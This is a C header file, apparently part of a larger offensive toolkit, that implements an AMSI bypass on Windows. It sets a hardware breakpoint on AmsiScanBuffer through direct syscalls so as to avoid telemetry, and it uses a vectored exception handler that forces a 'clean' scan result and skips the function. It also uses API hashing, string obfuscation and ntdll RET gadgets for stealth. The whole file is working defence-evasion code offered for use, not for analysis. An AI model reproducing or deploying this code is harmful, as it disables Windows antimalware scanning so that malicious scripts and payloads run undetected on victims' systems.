#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

// Shared globals
extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// VEH-BASED AMSI BYPASS WITH RE-ARMING & AUTO-REMOVAL
// =============================================================================

#define VEH_MAX_INVOCATIONS 50

typedef struct _VEH_AMSI_STATE {
    PVOID  TargetAddress;       // AmsiScanBuffer address
    PVOID  VehHandle;           // VEH registration handle
    DWORD  DrIndex;             // Debug register index (0-3)
    volatile LONG InvocationCount;
    BOOL   IsActive;
} VEH_AMSI_STATE;

static VEH_AMSI_STATE g_VehState = {0};

// -----------------------------------------------------------------------------
// Find a RET gadget in ntdll as fallback for RIP redirection
// -----------------------------------------------------------------------------
static PVOID FindNtdllRetGadget() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE base = (PBYTE)hNtdll + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size; j++) {
                if (base[j] == 0xC3) return (PVOID)(base + j);
            }
        }
    }
    return NULL;
}

// -----------------------------------------------------------------------------
// VEH Callback – intercepts HWBP on AmsiScanBuffer, re-arms, auto-removes
// -----------------------------------------------------------------------------
static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
    PEXCEPTION_RECORD pRec = ExceptionInfo->ExceptionRecord;
    PCONTEXT pCtx = ExceptionInfo->ContextRecord;

    if (pRec->ExceptionCode != EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;
    if (pRec->ExceptionAddress != g_VehState.TargetAddress) return EXCEPTION_CONTINUE_SEARCH;

    // Confirm the correct DR triggered
    DWORD bpTriggered = (pCtx->Dr6 & 0x0F);
    if (!(bpTriggered & (1 << g_VehState.DrIndex))) return EXCEPTION_CONTINUE_SEARCH;

    // Increment invocation counter
    LONG count = InterlockedIncrement(&g_VehState.InvocationCount);

    // Patch result: set AMSI_RESULT_CLEAN via stack
    PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
    if (pResult && !IsBadWritePtr(pResult, sizeof(DWORD))) {
        *pResult = 0; // AMSI_RESULT_CLEAN
    }

    // Set return value to S_OK
    pCtx->Rax = 0;

    // Redirect RIP to after the function (find RET in AmsiScanBuffer)
    PBYTE pFunc = (PBYTE)g_VehState.TargetAddress;
    BOOL found = FALSE;
    if (pFunc && !IsBadReadPtr(pFunc, 0x200)) {
        for (SIZE_T i = 0; i < 0x200; i++) {
            if (pFunc[i] == 0xC3) {
                pCtx->Rip = (DWORD64)(pFunc + i);
                found = TRUE;
                break;
            }
            if (pFunc[i] == 0xC2) { // RET imm16
                pCtx->Rip = (DWORD64)(pFunc + i);
                found = TRUE;
                break;
            }
        }
    }

    // Fallback: use ntdll ret gadget if we couldn't find one
    if (!found) {
        PVOID retGadget = FindNtdllRetGadget();
        if (retGadget) pCtx->Rip = (DWORD64)retGadget;
    }

    // Clear Dr6 status
    pCtx->Dr6 = 0;

    // Re-arm the hardware breakpoint for next invocation
    if (count < VEH_MAX_INVOCATIONS) {
        // Keep DR set – the breakpoint stays armed
        // Just ensure it's still configured
        switch (g_VehState.DrIndex) {
            case 0: pCtx->Dr0 = (DWORD64)g_VehState.TargetAddress; break;
            case 1: pCtx->Dr1 = (DWORD64)g_VehState.TargetAddress; break;
            case 2: pCtx->Dr2 = (DWORD64)g_VehState.TargetAddress; break;
            case 3: pCtx->Dr3 = (DWORD64)g_VehState.TargetAddress; break;
        }
        // Re-enable in DR7
        pCtx->Dr7 |= (1 << (g_VehState.DrIndex * 2));
    } else {
        // Auto-remove after VEH_MAX_INVOCATIONS
        pCtx->Dr0 = pCtx->Dr1 = pCtx->Dr2 = pCtx->Dr3 = 0;
        pCtx->Dr7 = 0x400; // default
        g_VehState.IsActive = FALSE;

        // Schedule VEH removal (can't remove inside handler safely)
        // Mark for removal; caller should check and call RemoveVEH
    }

    return EXCEPTION_CONTINUE_EXECUTION;
}

// =============================================================================
// INSTALL HWBP VIA SYSCALLS (NtGet/SetThreadContext)
// =============================================================================

static BOOL InstallHWBP_Syscall(PVOID targetAddress, DWORD drIndex) {
    if (!targetAddress || drIndex > 3) return FALSE;

    g_VehState.TargetAddress = targetAddress;
    g_VehState.DrIndex = drIndex;
    g_VehState.InvocationCount = 0;
    g_VehState.IsActive = TRUE;

    // Register VEH handler (first in chain)
    g_VehState.VehHandle = AddVectoredExceptionHandler(1, VEHCallback);
    if (!g_VehState.VehHandle) return FALSE;

    // Use syscalls for Get/SetThreadContext to avoid telemetry
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtGetContextThread.ssn,
        g_SyscallGadget, hThread, &ctx);
    if (status != 0) {
        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
        g_VehState.IsActive = FALSE;
        return FALSE;
    }

    // Set debug register
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)targetAddress; break;
        case 1: ctx.Dr1 = (DWORD64)targetAddress; break;
        case 2: ctx.Dr2 = (DWORD64)targetAddress; break;
        case 3: ctx.Dr3 = (DWORD64)targetAddress; break;
    }

    // Enable execution breakpoint on drIndex
    ctx.Dr7 |= (1 << (drIndex * 2));
    ctx.Dr7 &= ~(3 << (16 + drIndex * 4)); // condition: execution (00)
    ctx.Dr7 &= ~(3 << (18 + drIndex * 4)); // length: 1 byte (00)

    status = InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn,
        g_SyscallGadget, hThread, &ctx);
    if (status != 0) {
        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
        g_VehState.IsActive = FALSE;
        return FALSE;
    }

    return TRUE;
}

// =============================================================================
// CLEANUP
// =============================================================================

static void RemoveVEH() {
    if (g_VehState.VehHandle) {
        RemoveVectoredExceptionHandler(g_VehState.VehHandle);
        g_VehState.VehHandle = NULL;
    }
    g_VehState.IsActive = FALSE;

    // Clear debug registers via syscall
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    InvokeSyscall(g_ApiTable.syscalls.NtGetContextThread.ssn, g_SyscallGadget, hThread, &ctx);
    ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
    ctx.Dr7 = 0x400;
    ctx.Dr6 = 0;
    InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn, g_SyscallGadget, hThread, &ctx);
}

// =============================================================================
// PUBLIC: AMSI BYPASS VIA RE-ARMING VEH
// =============================================================================

static BOOL BypassAMSI_HWBP() {
    // Find amsi.dll
    PVOID hAmsi = NULL;
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        LDR_DATA_TABLE_ENTRY_PTR *pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'a') {
            hAmsi = pMod->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }

    if (!hAmsi) {
        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
        LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
        hAmsi = pLLW(OBFUSCATE(L"amsi.dll"));
    }
    if (!hAmsi) return FALSE;

    // Resolve AmsiScanBuffer
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + pDos->e_lfanew);
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hAmsi + expRVA);
    PDWORD pNames = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PBYTE)hAmsi + pExp->AddressOfNameOrdinals);

    PVOID pAmsiScanBuffer = NULL;
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *n = (const char *)((PBYTE)hAmsi + pNames[i]);
        if (n[0] == 'A' && n[4] == 'S' && n[8] == 'B') {
            pAmsiScanBuffer = (PVOID)((PBYTE)hAmsi + pFuncs[pOrds[i]]);
            break;
        }
    }
    if (!pAmsiScanBuffer) return FALSE;

    return InstallHWBP_Syscall(pAmsiScanBuffer, 0);
}

#endif
